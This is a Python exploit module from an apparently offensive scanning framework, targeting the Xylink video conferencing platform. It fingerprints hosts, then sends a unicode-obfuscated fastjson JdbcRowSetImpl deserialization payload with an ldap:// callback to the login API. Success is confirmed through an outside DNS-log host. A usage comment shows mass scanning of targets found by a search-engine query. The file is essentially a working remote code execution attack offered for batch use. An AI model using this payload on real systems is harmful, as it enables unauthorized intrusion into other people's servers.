# coding=utf-8
# @Author   : zpchcbd HG team
# @blog     : https://www.cnblogs.com/zpchcbd/
# @Time     : 2021-11-19 15:25

from core.data import gLogger
from core.utils.dnslog import eyes_dnslog_verify, get_eyes_identifier
from exploit.scripts import BaseScript
from core.myenums import *
from core.request.asynchttp import *


# python3 batch.py -m exploit.scripts.Meeting.Xylink.unauth_rce -cs -fs "title=\"云视讯管理平台\""

class Script(BaseScript):
    name = 'Xylink'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.DESERIALIZE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = 'https://cvepush.com/2022/07/25/%e5%b0%8f%e9%b1%bc%e6%98%93%e8%bf%9e%e4%bc%9a%e8%ae%ae%e7%b3%bb%e7%bb%9frce-2/'
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/api/rest/v1/h323/login']
        # 相关信息
        self.info = '小鱼易连视频会议系统 fastjson rce'

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detectPath in self.detect_path_list:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detectPath}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and 'buffet_front/favicon.ico' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'application/json'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                verify_random_int = random.randint(10000, 99999)
                data = r'''{"name":{"\u0040\u0074\u0079\u0070\u0065":"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073","\u0076\u0061\u006c":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"},"x":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065":"ldap://''' + str(verify_random_int) + '''.{}","autoCommit":true}}'''.format(get_eyes_identifier())
                await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=self.headers, timeout=self.req_timeout)
                await asyncio.sleep(2)
                text = await eyes_dnslog_verify('dns', verify_random_int)
                if text is not None and text:
                    gLogger.myscan_info('[{} {} Verify:{}] {}'.format(self.name, self.bug_type, verify_random_int, url))
                    return {'name': '{} {} - Verify param {}'.format(self.name, self.bug_type, verify_random_int), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass